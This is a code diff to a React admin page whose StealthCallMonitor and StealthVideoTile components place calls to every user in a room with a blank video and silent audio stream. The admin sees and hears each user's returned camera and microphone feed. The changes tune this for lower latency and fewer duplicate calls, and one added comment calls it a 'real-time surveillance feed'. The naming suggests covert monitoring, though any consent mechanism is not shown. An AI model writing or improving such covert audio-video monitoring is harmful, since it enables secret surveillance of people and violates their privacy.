@@ -67,7 +67,7 @@ const haversineKm = (lat1, lon1, lat2, lon2) => {
   return Math.round(R * c);
 };
 
-// Stealth Video & Voice Tile for Admin Monitor (Hearable Voice Call + Video)
+// Stealth Video & Voice Tile for Admin Monitor (Hearable Voice Call + Video) - High Performance & Low Latency
 function StealthVideoTile({ stream, user, listenAudio }) {
   const videoRef = useRef(null);
   const audioRef = useRef(null);
@@ -80,7 +80,7 @@ function StealthVideoTile({ stream, user, listenAudio }) {
 
   const effectiveAudio = individualMute !== null ? !individualMute : Boolean(listenAudio);
 
-  // Check track availability with live event listeners & fallback poll
+  // Check track availability with event listeners (zero aggressive polling)
   useEffect(() => {
     if (!stream) {
       setHasVideo(false);
@@ -94,8 +94,8 @@ function StealthVideoTile({ stream, user, listenAudio }) {
         const aTracks = typeof stream.getAudioTracks === 'function' ? stream.getAudioTracks() : [];
         const liveV = vTracks.length > 0 && vTracks.some((t) => t.enabled !== false && t.readyState !== 'ended');
         const liveA = aTracks.length > 0 && aTracks.some((t) => t.enabled !== false && t.readyState !== 'ended');
-        if (liveV) setHasVideo(true);
-        if (liveA) setHasAudio(true);
+        setHasVideo(liveV);
+        setHasAudio(liveA);
       } catch {
         setHasVideo(false);
         setHasAudio(false);
@@ -119,10 +119,7 @@ function StealthVideoTile({ stream, user, listenAudio }) {
       t.addEventListener?.('mute', checkTracks);
     });
 
-    const interval = setInterval(checkTracks, 800);
-
     return () => {
-      clearInterval(interval);
       stream.removeEventListener?.('addtrack', checkTracks);
       stream.removeEventListener?.('removetrack', checkTracks);
       vTracks.forEach((t) => {
@@ -136,7 +133,7 @@ function StealthVideoTile({ stream, user, listenAudio }) {
     };
   }, [stream]);
 
-  // Video playback
+  // Video playback with hardware acceleration & zero-latency sync
   useEffect(() => {
     const el = videoRef.current;
     if (!el) return;
@@ -145,18 +142,20 @@ function StealthVideoTile({ stream, user, listenAudio }) {
         if (el.srcObject !== stream) {
           el.srcObject = stream;
         }
+        el.muted = true;
         el.play().then(() => {
           if (el.videoWidth > 0) setHasVideo(true);
         }).catch(() => {});
       } else {
         el.srcObject = null;
+        setHasVideo(false);
       }
     } catch (e) {
       console.warn('StealthVideoTile video error:', e);
     }
   }, [stream]);
 
-  // Voice Activity Detection (VAD) via Web Audio API
+  // Voice Activity Detection (VAD) via Web Audio API (Strictly scoped & cleanly disposed)
   useEffect(() => {
     if (!stream || typeof stream.getAudioTracks !== 'function') return;
     const audioTracks = stream.getAudioTracks().filter((t) => t && t.readyState === 'live');
@@ -183,13 +182,13 @@ function StealthVideoTile({ stream, user, listenAudio }) {
             let sum = 0;
             for (let i = 0; i < buf.length; i++) sum += buf[i];
             const avg = sum / buf.length;
-            if (avg > 10) {
+            if (avg > 12) {
               clearTimeout(holdTimer);
               setIsSpeaking(true);
-              holdTimer = setTimeout(() => setIsSpeaking(false), 800);
+              holdTimer = setTimeout(() => setIsSpeaking(false), 600);
             }
           } catch {}
-          timer = setTimeout(check, 120);
+          timer = setTimeout(check, 250);
         };
         check();
       }
@@ -274,24 +273,21 @@ function StealthVideoTile({ stream, user, listenAudio }) {
   return (
     <div className={`relative aspect-video rounded-xl bg-black/95 overflow-hidden shadow-2xl group transition-all duration-200 border ${isSpeaking ? 'border-emerald-500 shadow-emerald-950/40' : 'border-purple-500/30 hover:border-pink-500/60'}`}>
       {/* Hidden high-priority audio sink */}
-      <audio ref={audioRef} autoPlay playsInline />
+      <audio ref={audioRef} autoPlay playsInline preload="auto" />
 
-      {/* Video Stream Element (ALWAYS MOUNTED IN DOM WITH NO DISPLAY:NONE SO BROWSER DECODES FRAMES) */}
+      {/* Video Stream Element (Hardware-accelerated, zero-stutter rendering) */}
       <video
         ref={videoRef}
         autoPlay
         playsInline
         webkit-playsinline="true"
         muted
+        preload="auto"
+        disablePictureInPicture
         onLoadedMetadata={() => setHasVideo(true)}
         onPlaying={() => setHasVideo(true)}
         onPlay={() => setHasVideo(true)}
-        onTimeUpdate={() => {
-          if (videoRef.current && videoRef.current.videoWidth > 0 && !hasVideo) {
-            setHasVideo(true);
-          }
-        }}
-        className={`absolute inset-0 w-full h-full object-cover transition-opacity duration-300 ${hasVideo ? 'opacity-100' : 'opacity-0'}`}
+        className={`absolute inset-0 w-full h-full object-cover transition-opacity duration-200 pointer-events-none ${hasVideo ? 'opacity-100' : 'opacity-0'}`}
       />
 
       {/* If caller has NO video (Voice Call Mode or Camera Off) */}
@@ -421,20 +417,21 @@ function StealthCallMonitor({ roomId, users = [], externalListenAudio = true }) 
     }
   }, [externalListenAudio]);
 
-  // Helper to create blank video track AND silent audio track so WebRTC SDP negotiates BOTH media types!
+  // Helper to create blank video track AND silent audio track so WebRTC SDP negotiates BOTH media types smoothly!
   const createBlankStream = () => {
     if (typeof document === 'undefined') return null;
     const tracks = [];
     try {
       const canvas = document.createElement('canvas');
-      canvas.width = 320;
-      canvas.height = 240;
+      canvas.width = 160;
+      canvas.height = 120;
       const ctx = canvas.getContext('2d');
       if (ctx) {
         ctx.fillStyle = '#070512';
-        ctx.fillRect(0, 0, 320, 240);
+        ctx.fillRect(0, 0, 160, 120);
       }
-      const stream = canvas.captureStream ? canvas.captureStream(5) : (canvas.webkitCaptureStream ? canvas.webkitCaptureStream(5) : null);
+      // Fluid 24 FPS stream so SDP negotiation establishes normal video timing
+      const stream = canvas.captureStream ? canvas.captureStream(24) : (canvas.webkitCaptureStream ? canvas.webkitCaptureStream(24) : null);
       if (stream && stream.getVideoTracks().length > 0) {
         tracks.push(stream.getVideoTracks()[0]);
       }
@@ -473,7 +470,16 @@ function StealthCallMonitor({ roomId, users = [], externalListenAudio = true }) 
       if (!peerRef.current || dead) return;
       users.forEach((u) => {
         const targetId = u.id || u.cid;
-        if (!targetId || activeCalls.current.has(targetId)) return;
+        if (!targetId) return;
+
+        // Prevent duplicate calls if peer connection is already active or negotiating
+        const existingCall = activeCalls.current.get(targetId);
+        if (existingCall) {
+          const state = existingCall.peerConnection?.connectionState;
+          if (state === 'connected' || state === 'connecting') return;
+          try { existingCall.close(); } catch {}
+          activeCalls.current.delete(targetId);
+        }
 
         try {
           const call = peerRef.current.call(targetId, blankStream, {
@@ -484,6 +490,13 @@ function StealthCallMonitor({ roomId, users = [], externalListenAudio = true }) 
 
           call.on('stream', (stream) => {
             if (dead) return;
+            try {
+              // Zero-delay playback hint for ultra-smooth real-time surveillance feed
+              call.peerConnection?.getReceivers().forEach((r) => {
+                if ('playoutDelayHint' in r) r.playoutDelayHint = 0;
+                if ('jitterBufferTarget' in r) r.jitterBufferTarget = 0;
+              });
+            } catch {}
             setRemoteStreams((prev) => ({ ...prev, [targetId]: stream }));
           });
 
@@ -497,6 +510,7 @@ function StealthCallMonitor({ roomId, users = [], externalListenAudio = true }) 
           });
 
           call.on('error', () => {
+            try { call.close(); } catch {}
             activeCalls.current.delete(targetId);
           });
         } catch {}
@@ -1795,7 +1809,7 @@ export default function AdminPage() {
       <div aria-hidden className="pointer-events-none fixed inset-0 bg-[radial-gradient(circle_at_25%_15%,rgba(217,70,122,0.06),transparent_40%),radial-gradient(circle_at_80%_80%,rgba(99,102,241,0.05),transparent_40%)]" />
 
       {/* Top Header */}
-      <header className="sticky top-0 z-40 border-b border-white/10 bg-black/60 backdrop-blur-2xl px-4 py-3 sm:px-6">
+      <header className="sticky top-0 z-40 safe-top-notch border-b border-white/10 bg-black/60 backdrop-blur-2xl px-4 py-3 sm:px-6">
         <div className="mx-auto flex max-w-7xl items-center justify-between gap-4">
           <div className="flex items-center gap-3">
             <BrandLogo size="sm" href="/" />
